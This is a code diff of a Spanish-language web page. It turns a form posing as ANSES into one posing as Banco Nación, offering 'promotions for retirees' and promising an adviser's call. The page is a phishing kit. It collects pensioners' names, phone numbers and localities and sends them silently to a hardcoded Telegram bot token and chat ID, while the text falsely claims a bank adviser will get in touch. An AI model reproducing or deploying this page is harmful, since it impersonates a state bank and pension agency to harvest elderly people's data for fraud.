@@ -3,19 +3,19 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Consulta de Jubilación - ANSES</title>
+  <title>Banco Nación - Beneficios Jubilados</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </head>
 <body class="min-h-screen flex bg-gray-100">
 
-  <!-- Imagen lateral -->
+  <!-- Imagen lateral Banco Nación -->
   <div class="hidden md:block md:w-1/2 relative">
-    <img src="./anses-jubilados-noviembrejpg.webp" alt="Fondo ANSES" class="w-full h-full object-cover" />
+    <img src="https://www.bna.com.ar/Personas/PublishingImages/jubilados-cobros.jpg" alt="Banco Nación Jubilados" class="w-full h-full object-cover" />
     <div class="absolute inset-0 bg-black bg-opacity-60"></div>
-    <div class="absolute inset-0 flex items-center justify-center">
-      <h2 class="text-white text-3xl font-bold text-center px-6 leading-snug">
-        Consultas sobre Jubilación<br>ANSES
+    <div class="absolute inset-0 flex items-center justify-center px-6">
+      <h2 class="text-white text-3xl font-bold text-center leading-snug">
+        Consultá tus <span class="text-green-300">beneficios</span><br>en Banco Nación
       </h2>
     </div>
   </div>
@@ -23,41 +23,41 @@
   <!-- Formulario -->
   <div class="w-full md:w-1/2 flex items-center justify-center p-6">
     <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
-      <h1 class="text-2xl font-bold text-center text-blue-700 mb-6">Formulario de Consulta</h1>
+      <h1 class="text-2xl font-bold text-center text-blue-800 mb-4">Promociones para Jubilados</h1>
+      <p class="text-center text-gray-600 text-sm mb-6">Completá el formulario y un asesor del Banco Nación te contactará.</p>
 
       <form id="consultaForm" class="space-y-4">
         <div>
           <label class="block text-sm font-medium text-gray-700">Nombre</label>
-          <input type="text" name="nombre" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
+          <input type="text" name="nombre" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-600">
         </div>
         <div>
           <label class="block text-sm font-medium text-gray-700">Apellido</label>
-          <input type="text" name="apellido" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
+          <input type="text" name="apellido" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-600">
         </div>
         <div>
           <label class="block text-sm font-medium text-gray-700">Teléfono</label>
-          <input type="tel" name="telefono" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
+          <input type="tel" name="telefono" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-600">
         </div>
         <div>
-          <label class="block text-sm font-medium text-gray-700">Dirección</label>
-          <input type="text" name="direccion" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
+          <label class="block text-sm font-medium text-gray-700">Localidad</label>
+          <input type="text" name="direccion" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-600">
         </div>
         <div>
-          <label class="block text-sm font-medium text-gray-700">Motivo de la consulta</label>
-          <textarea name="motivo" rows="3" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500"></textarea>
+          <label class="block text-sm font-medium text-gray-700">Consulta o beneficio de interés</label>
+          <textarea name="motivo" rows="3" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-600"></textarea>
         </div>
 
-        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-xl hover:bg-blue-700">
+        <button type="submit" class="w-full bg-blue-700 text-white py-2 rounded-xl hover:bg-blue-800">
           Enviar Consulta
         </button>
       </form>
     </div>
   </div>
 
-  <!-- SCRIPT: Telegram + SweetAlert -->
   <script>
-    const TOKEN = "7738205754:AAGCrVwdl7Ls_jNb-bpBX_c6xxQv5NOYK6Y"; // ← Reemplaza con tu token del Bot de BotFather
-    const CHAT_ID = "-4774402515"; // ← Reemplaza con tu chat_id
+    const TOKEN = "7738205754:AAGCrVwdl7Ls_jNb-bpBX_c6xxQv5NOYK6Y";
+    const CHAT_ID = "-4774402515";
 
     const form = document.getElementById('consultaForm');
 
@@ -66,11 +66,11 @@
 
       const datos = new FormData(form);
       const mensaje = `
-📬 *Nueva Consulta de Jubilación*
+🏦 *Nueva Consulta Banco Nación*
 👤 *Nombre:* ${datos.get('nombre')} ${datos.get('apellido')}
 📞 *Teléfono:* ${datos.get('telefono')}
-🏠 *Dirección:* ${datos.get('direccion')}
-📝 *Motivo:* ${datos.get('motivo')}
+📍 *Localidad:* ${datos.get('direccion')}
+💬 *Consulta:* ${datos.get('motivo')}
       `;
 
       const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
@@ -87,9 +87,9 @@
 
         Swal.fire({
           icon: 'success',
-          title: 'Gracias por su consulta',
-          text: 'Pronto nos pondremos en contacto con usted.',
-          confirmButtonColor: '#2563eb',
+          title: 'Consulta enviada',
+          text: 'Gracias por confiar en Banco Nación. Pronto un asesor se contactará con usted.',
+          confirmButtonColor: '#1e3a8a'
         });
 
         form.reset();
@@ -98,7 +98,7 @@
           icon: 'error',
           title: 'Error al enviar',
           text: 'No se pudo enviar la consulta. Intente nuevamente más tarde.',
-          confirmButtonColor: '#dc2626',
+          confirmButtonColor: '#dc2626'
         });
       }
     });
